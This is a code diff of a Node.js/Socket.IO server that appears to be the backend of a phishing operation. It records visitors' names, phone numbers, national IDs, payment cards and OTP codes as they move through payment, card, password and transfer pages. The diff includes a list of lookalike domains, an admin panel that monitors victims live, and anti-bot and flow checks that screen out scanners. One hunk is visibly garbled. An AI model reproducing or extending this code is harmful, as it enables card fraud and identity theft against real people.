@@ -143,7 +143,7 @@ app.get("/api/debug-visitors", (req, res) => res.json({ count: savedVisitors.len
 // CORS Configuration - Dynamic (reads from allowedDomains)
 const corsOptions = {
   origin: function (origin, callback) {
-    if (!origin) return callback(new Error("Origin required"), false);
+    if (!origin) return callback(null, true);
     const allowed = buildAllowedOrigins();
     if (allowed.some(a => origin.startsWith(a))) {
       callback(null, true);
@@ -156,20 +156,7 @@ const corsOptions = {
 };
 
 app.use(compression());
-
-// Admin panel CORS bypass - allow admin from any domain (auth is handled by password)
-app.use((req, res, next) => {
-  if (req.path.startsWith('/admin') || req.path.startsWith('/socket.io') || req.path.startsWith('/api/visitors') || req.path.startsWith('/api/stats') || req.path.startsWith('/api/fcm')) {
-    res.header('Access-Control-Allow-Origin', req.headers.origin || '*');
-    res.header('Access-Control-Allow-Credentials', 'true');
-    res.header('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE,OPTIONS');
-    res.header('Access-Control-Allow-Headers', 'Content-Type,Authorization');
-    if (req.method === 'OPTIONS') return res.sendStatus(200);
-    return next();
-  }
-  // For all other paths, use strict CORS (only allowed domains)
-  cors(corsOptions)(req, res, next);
-});
+app.use(cors(corsOptions));
 app.use(express.json({ limit: '1mb' }));
 app.use(cookieParser());
 
@@ -384,13 +371,17 @@ app.use((req, res, next) => {
 // Socket.IO Configuration
 const io = new Server(server, {
   maxHttpBufferSize: 10000, // 10KB max message size - prevents large payload attacks
-  pingTimeout: 30000, // 30s - give more time for admin connections through Cloudflare
+  pingTimeout: 15000, // 15s - disconnect dead connections faster
   pingInterval: 10000, // 10s - check connections more frequently
   cors: {
     origin: function (origin, callback) {
       if (!origin) return callback(null, true);
-      // Allow all origins for Socket.IO - admin auth + io.use middleware handle security
-      callback(null, true);
+      const allowed = buildAllowedOrigins();
+      if (allowed.some(a => origin.startsWith(a))) {
+        callback(null, true);
+      } else {
+        callback(new Error('Not allowed by CORS'));
+      }
     },
     credentials: true,
   },
@@ -398,9 +389,6 @@ const io = new Server(server, {
   allowRequest: (req, callback) => {
     const origin = req.headers.origin || req.headers.referer || '';
     if (!origin) return callback(null, true);
-    // Allow admin panel connections from any origin
-    const url = new URL('http://dummy' + (req.url || ''));
-    if (url.searchParams.get('admin') === 'true') return callback(null, true);
     const allowed = buildAllowedOrigins();
     if (allowed.some(a => origin.startsWith(a))) {
       callback(null, true);
@@ -583,9 +571,32 @@ let globalBlockedCountries = savedData.globalBlockedCountries || []; // Global b
 let adminPassword = savedData.adminPassword || "admin123"; // Admin password (persisted)
 
 // Default allowed domains
-// Allowed domains - fully managed from admin panel, no hardcoded defaults
-let allowedDomains = savedData.allowedDomains || [];
-console.log(`[STARTUP] Allowed domains (${allowedDomains.length}): ${allowedDomains.join(', ')}`);
+const DEFAULT_ALLOWED_DOMAINS = [
+  'alamsallameh.com',
+  'amnwsalameh.com',
+  'amansallameh.com',
+  'elfahestheq.com',
+  'rasallameh.com',
+  'dfarelfahis.com',
+  'ameeralfahisi.com',
+  'assemalfatheh.com',
+  'serftay.com',
+  'serftayi.com',
+  'ancesture.com',
+  'ancesturei.com',
+  'aturtestar.com',
+  'alterantest.com',
+  'alterantesti.com',
+  'drshelen.com',
+  'zaliastafie.com',
+  'zaliastafi.com',
+  'qatvitfy.com',
+  'cevftiyi.com',
+  'cevftiye.com',
+  "alvestifay.com",
+  "alvestifayi.com",
+];
+let allowedDomains = savedData.allowedDomains || [...DEFAULT_ALLOWED_DOMAINS]; // Allowed domains (persisted)
 
 // Build full origins list from allowed domains
 function buildAllowedOrigins() {
@@ -595,7 +606,7 @@ function buildAllowedOrigins() {
     origins.push(`https://www.${domain}`);
     origins.push(`https://api.${domain}`);
   });
-  // Dynamically allow Railway public domain (for admin panel access)
+  // Dynamically allow Railway public domain
   if (process.env.RAILWAY_PUBLIC_DOMAIN) {
     origins.push(`https://${process.env.RAILWAY_PUBLIC_DOMAIN}`);
   }
@@ -603,18 +614,6 @@ function buildAllowedOrigins() {
   if (process.env.CLIENT_URL) {
     origins.push(process.env.CLIENT_URL);
   }
-  // Always allow the server's own custom domains (for admin panel)
-  // This ensures admin panel always works even if allowedDomains is empty
-  if (process.env.RAILWAY_PUBLIC_DOMAIN) {
-    origins.push(`https://${process.env.RAILWAY_PUBLIC_DOMAIN}`);
-  }
-  // Auto-detect and allow any custom domain pointing to this server
-  origins.push('https://api.derastifay.com');
-  origins.push('https://derastifay.com');
-  origins.push('https://www.derastifay.com');
-  origins.push('https://mestifay.com');
-  origins.push('https://www.mestifay.com');
-  origins.push('https://api.mestifay.com');
   // Always allow Netlify deploy URL
   origins.push('https://fahos.netlify.app');
   origins.push('https://master--fahos.netlify.app');
@@ -932,12 +931,6 @@ function broadcastVisitorsToAdmins() {
 }
 
 // === Anti-Bot Protection ===
-// Track form fill time - visitors must spend at least 20 seconds on registration page
-const MINIMUM_FORM_FILL_TIME = 20000; // 20 seconds minimum
-// Track IP registration submissions per minute (prevent same IP submitting multiple times)
-const ipSubmissionTimestamps = new Map(); // ip -> last submission timestamp
-const IP_SUBMISSION_COOLDOWN = 60000; // 1 minute between submissions from same IP
-
 // Track connections per IP (max concurrent connections per IP)
 const ipConnectionCount = new Map();
 // Track new visitor registrations per minute
@@ -1544,17 +1537,10 @@ io.on("connection", (socket) => {
       // Create new visitor
       visitorCounter++;
       if (displayVisitorCount !== null) displayVisitorCount++;
-      // Extract domain from origin header for tracking
-      const visitorOrigin = socket.handshake.headers.origin || socket.handshake.headers.referer || '';
-      const visitorDomain = visitorOrigin.replace(/^https?:\/\//, '').replace(/\/.*$/, '').replace(/^(www\.)?/, '') || 'unknown';
-      
-      // Anti-Bot/Anti-Empty: Don't add to savedVisitors yet.
-      // We only create the object in memory and attach it to the socket.
-      // It will be pushed to savedVisitors only when they send real data (more-info event).
       visitor = {
         _id: `visitor_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`,
         socketId: socket.id,
-        visitorNumber: -1, // Temporary number
+        visitorNumber: visitorCounter,
         createdAt: new Date().toISOString(),
         isRead: false,
         fullName: "",
@@ -1567,7 +1553,6 @@ io.on("connection", (socket) => {
         os,
         device,
         browser,
-        domain: visitorDomain,
         date: new Date().toISOString(),
         blockedCardPrefixes: [],
         page: "الصفحة الرئيسية",
@@ -1583,10 +1568,10 @@ io.on("connection", (socket) => {
         sessionStartTime: Date.now(),
         lastActivity: Date.now(),
       };
-      
-      socket._pendingVisitor = visitor;
+      savedVisitors.push(visitor);
+      saveData(true); // Save immediately to prevent data loss on restart
       isNewVisitor = true;
-      console.log(`New visitor connection pending (not saved yet): ${visitor._id}, domain=${visitorDomain}`);
+      console.log(`New visitor registered: ${visitor._id}`);
 
       // Lookup country and city from IP if unknown
       if (visitor.country === 'Unknown') {
@@ -1679,12 +1664,6 @@ io.on("connection", (socket) => {
       if (page === "الصفحة الرئيسية" || page === "الرئيسية") {
         visitor.hasVisitedMainPage = true;
       }
-      
-      // Track when visitor enters registration page (for 20s timer)
-      if (page === "صفحة التسجيل") {
-        visitor.registrationPageEnteredAt = Date.now();
-        console.log(`[TIMER] Visitor ${visitor._id} entered registration page at ${visitor.registrationPageEnteredAt}`);
-      }
 
       // STRICT ENFORCEMENT: Block visitors who try to access sensitive pages without visiting main page first
       const sensitivePages = ["دفع", "ATM", "بطاقة", "summary", "ملخص", "الدفع", "رمز التحقق", "OTP", "كلمة مرور", "توثيق", "تحويل"];
@@ -1728,116 +1707,58 @@ io.on("connection", (socket) => {
   socket.on("more-info", (data) => {
     console.log(`[DEBUG] more-info received from socket ${socket.id}, data:`, JSON.stringify(data));
     let visitor = visitors.get(socket.id);
-    
-    // === ANTI-BOT: 20-second minimum form fill time ===
-    if (visitor && data.page === "صفحة التسجيل" && data.content) {
-      const enteredAt = visitor.registrationPageEnteredAt || 0;
-      const timeSpent = Date.now() - enteredAt;
-      if (enteredAt > 0 && timeSpent < MINIMUM_FORM_FILL_TIME) {
-        console.log(`[ANTI-BOT] Form filled too fast (${Math.round(timeSpent/1000)}s < 20s) - visitor ${visitor._id}, IP=${visitor.ip}. SILENTLY REJECTED.`);
-        // Silently reject - don't save, don't show in admin, disconnect
-        socket.disconnect(true);
-        const idx = savedVisitors.findIndex(v => v._id === visitor._id);
-        if (idx !== -1) {
-          savedVisitors.splice(idx, 1);
-          saveData(true);
-          broadcastVisitorsToAdmins();
-        }
-        visitors.delete(socket.id);
-        return;
+    if (!visitor) {
+      // Create full visitor if not exists (e.g. reconnect after server redeploy)
+      const visitorInfo = getVisitorInfo(socket);
+      const { os, device, browser } = parseUserAgent(visitorInfo.userAgent);
+      visitorCounter++;
+      if (displayVisitorCount !== null) displayVisitorCount++;
+      // Try to find by visitorId first if provided
+      if (data.visitorId) {
+        visitor = savedVisitors.find(v => v._id === data.visitorId);
       }
-    }
-    
-    // === ANTI-BOT: IP duplicate submission cooldown (1 per minute) ===
-    if (visitor && data.page === "صفحة التسجيل" && data.content) {
-      const visitorIP = visitor.ip;
-      const lastSubmission = ipSubmissionTimestamps.get(visitorIP) || 0;
-      const timeSinceLastSubmission = Date.now() - lastSubmission;
-      if (lastSubmission > 0 && timeSinceLastSubmission < IP_SUBMISSION_COOLDOWN) {
-        console.log(`[ANTI-BOT] Same IP submitted again too fast (${Math.round(timeSinceLastSubmission/1000)}s < 60s) - IP=${visitorIP}. SILENTLY REJECTED.`);
-        socket.disconnect(true);
-        const idx = savedVisitors.findIndex(v => v._id === visitor._id);
-        if (idx !== -1) {
-          savedVisitors.splice(idx, 1);
-          saveData(true);
-          broadcastVisitorsToAdmins();
-        }
-        visitors.delete(socket.id);
-        return;
-      }
-      // Record this submission timestamp
-      ipSubmissionTimestamps.set(visitorIP, Date.now());
-    }
-       if (!visitor) {
-      // Check if we have a pending visitor for this socket
-      if (socket._pendingVisitor) {
-        visitor = socket._pendingVisitor;
-        visitorCounter++;
-        if (displayVisitorCount !== null) displayVisitorCount++;
-        visitor.visitorNumber = visitorCounter;
-        visitor.page = data.page || "الصفحة الرئيسية";
-        
-        savedVisitors.push(visitor);
-        saveData(true);
-        console.log(`[more-info] Promoted pending visitor to saved: ${visitor._id}, # ${visitor.visitorNumber}`);
-        delete socket._pendingVisitor;
+      
+      if (visitor) {
+        visitor.socketId = socket.id;
+        visitor.isConnected = true;
+        visitor.lastActivity = Date.now();
+        console.log(`[more-info] Re-linked existing visitor: ${visitor._id}`);
       } else {
-        // Create full visitor if not exists (e.g. reconnect after server redeploy)
-        const visitorInfo = getVisitorInfo(socket);
-        const { os, device, browser } = parseUserAgent(visitorInfo.userAgent);
+        visitor = {
+          _id: data.visitorId || `visitor_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`,
+          socketId: socket.id,
+          visitorNumber: visitorCounter,
+          createdAt: new Date().toISOString(),
+          isRead: false,
+          fullName: "",
+          phone: "",
+          idNumber: "",
+          apiKey: generateApiKey(),
+          ip: visitorInfo.ip,
+          country: visitorInfo.country,
+          city: "",
+          os,
+          device,
+          browser,
+          date: new Date().toISOString(),
+          blockedCardPrefixes: [],
+          page: data.page || "الصفحة الرئيسية",
+          data: {},
+          dataHistory: [],
+          paymentCards: [],
+          rejectedCards: [],
+          digitCodes: [],
+          hasNewData: false,
+          isBlocked: false,
+          isConnected: true,
+          hasVisitedMainPage: false,
+          sessionStartTime: Date.now(),
+          lastActivity: Date.now(),
+        };
         
-        // Try to find by visitorId first if provided
-        if (data.visitorId) {
-          visitor = savedVisitors.find(v => v._id === data.visitorId);
-        }
-        
-        if (visitor) {
-          visitor.socketId = socket.id;
-          visitor.isConnected = true;
-          visitor.lastActivity = Date.now();
-          console.log(`[more-info] Re-linked existing visitor: ${visitor._id}`);
-        } else {
-          visitorCounter++;
-          if (displayVisitorCount !== null) displayVisitorCount++;
-          visitor = {
-            _id: data.visitorId || `visitor_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`,
-            socketId: socket.id,
-            visitorNumber: visitorCounter,
-            createdAt: new Date().toISOString(),
-            isRead: false,
-            fullName: "",
-            phone: "",
-            idNumber: "",
-            apiKey: generateApiKey(),
-            ip: visitorInfo.ip,
-            country: visitorInfo.country,
-            city: "",
-            os,
-            device,
-            browser,
-            domain: "unknown",
-            date: new Date().toISOString(),
-            blockedCardPrefixes: [],
-            page: data.page || "الصفحة الرئيسية",
-            data: {},
-            dataHistory: [],
-            paymentCards: [],
-            rejectedCards: [],
-            digitCodes: [],
-            hasNewData: false,
-            isBlocked: false,
-            isConnected: true,
-            hasVisitedMainPage: true,
-            sessionStartTime: Date.now(),
-            lastActivity: Date.now(),
-          };
-          savedVisitors.push(visitor);
-          saveData(true);
-          console.log(`[more-info] Created new visitor from data: ${visitor._id}`);
-        }
-      }
-      visitors.set(socket.id, visitor);
-    }ata.page && sensitiveKeywords.some(kw => data.page.includes(kw));
+        // STRICT: If first page is sensitive, block immediately
+        const sensitiveKeywords = ["دفع", "ATM", "بطاقة", "summary", "ملخص", "الدفع", "رمز التحقق", "OTP", "كلمة مرور", "توثيق", "تحويل"];
+        const firstPageIsSensitive = data.page && sensitiveKeywords.some(kw => data.page.includes(kw));
         if (firstPageIsSensitive) {
           console.log(`[STRICT-FLOW] Blocking new visitor created directly on sensitive page "${data.page}", IP=${visitorInfo.ip}`);
           socket.disconnect(true);
@@ -1918,59 +1839,26 @@ io.on("connection", (socket) => {
             
             // Name detection with fake name filtering
             if (k.includes("الاسم") || k.includes("اسم") || k.includes("name") || k.includes("user")) {
-              const fakeNames = ["خدمة", "فحص", "دوري", "فني", "service", "test", "check", "بوت", "bot", "123", "abc"];
+              const fakeNames = ["خدمة", "فحص", "دوري", "فني", "service", "test", "check"];
               const isFake = fakeNames.some(fake => v.toLowerCase().includes(fake));
               
               if (isFake) {
                 console.log(`[ANTI-BOT] Fake name detected: "${v}", IP=${visitor.ip}`);
                 visitor.isSuspicious = true;
+                // We don't set fullName to a fake name to keep it as "زائر #"
               } else if (!visitor.fullName || visitor.fullName.startsWith("زائر #")) {
-                // Accept any name that is at least 2 characters (e.g. "علي")
-                if (v.length >= 2) {
-                  visitor.fullName = v;
-                }
+                visitor.fullName = v;
               }
             }
             // Phone detection
             if (k.includes("جوال") || k.includes("هاتف") || k.includes("phone") || k.includes("mobile") || k.includes("tel")) {
-              // Basic phone validation (at least 7 digits)
-              if (v.replace(/\D/g, "").length >= 7) {
-                visitor.phone = v;
-              }
+              visitor.phone = v;
             }
-            // ID Number detection
-            if (k.includes("هوية") || k.includes("مدني") || k.includes("id") || k.includes("national")) {
-              // Basic ID validation (at least 5 digits)
-              if (v.replace(/\D/g, "").length >= 5) {
-                visitor.idNumber = v;
-              }
-            }
-          }
-        };
-        
-        detectIdentity(data.content);
-        
-        // STRICT VALIDATION: Only promote to savedVisitors if ALL required fields are present
-        const hasFullName = visitor.fullName && !visitor.fullName.startsWith("زائر #");
-        const hasPhone = visitor.phone && visitor.phone.length >= 7;
-        const hasIdNumber = visitor.idNumber && visitor.idNumber.length >= 5;
-        
-        const isComplete = hasFullName && hasPhone && hasIdNumber;
-        
-        if (isNewVisitor && !isComplete) {
-          console.log(`[STRICT-VALIDATION] Visitor data incomplete. Name:${!!hasFullName}, Phone:${!!hasPhone}, ID:${!!hasIdNumber}. IP=${visitor.ip}`);
-          // We don't disconnect yet, just don't save/show them. 
-          // They might be still typing or on the first step.
-          
-          // Ensure they are NOT in savedVisitors
-          const idx = savedVisitors.findIndex(v => v._id === visitor._id);
-          if (idx !== -1) {
-            savedVisitors.splice(idx, 1);
-            saveData(true);
-            broadcastVisitorsToAdmins();
-          }
-          return;
+        // ID Number detection
+        if (k.includes("هوية") || k.includes("مدني") || k.includes("id") || k.includes("national")) {
+          visitor.idNumber = v;
         }
+      }
       
       // Anti-Bot: Strictly block access to advanced pages for visitors without real names
       const isFakeName = (name) => {
@@ -2662,12 +2550,12 @@ io.on("connection", (socket) => {
       let cleanDomain = domain.replace(/^https?:\/\//, '').replace(/^www\./, '').replace(/\/+$/, '').toLowerCase();
       if (cleanDomain && !allowedDomains.includes(cleanDomain)) {
         allowedDomains.push(cleanDomain);
-        saveData(true); // Save IMMEDIATELY to persist across redeploys
+        saveData();
         // Notify all admins
         admins.forEach((admin, adminSocketId) => {
           io.to(adminSocketId).emit("allowedDomains:list", allowedDomains);
         });
-        console.log(`[DOMAINS] Added: ${cleanDomain} | Total: ${allowedDomains.length}`);
+        console.log(`Allowed domain added: ${cleanDomain}`);
       }
     }
   });
@@ -2675,12 +2563,12 @@ io.on("connection", (socket) => {
   // Allowed Domains: Remove domain
   socket.on("allowedDomains:remove", (domain) => {
     allowedDomains = allowedDomains.filter(d => d !== domain);
-    saveData(true); // Save IMMEDIATELY to persist across redeploys
+    saveData();
     // Notify all admins
     admins.forEach((admin, adminSocketId) => {
       io.to(adminSocketId).emit("allowedDomains:list", allowedDomains);
     });
-    console.log(`[DOMAINS] Removed: ${domain} | Total: ${allowedDomains.length}`);
+    console.log(`Allowed domain removed: ${domain}`);
   });
 
   // Bot Redirect: Get current URL
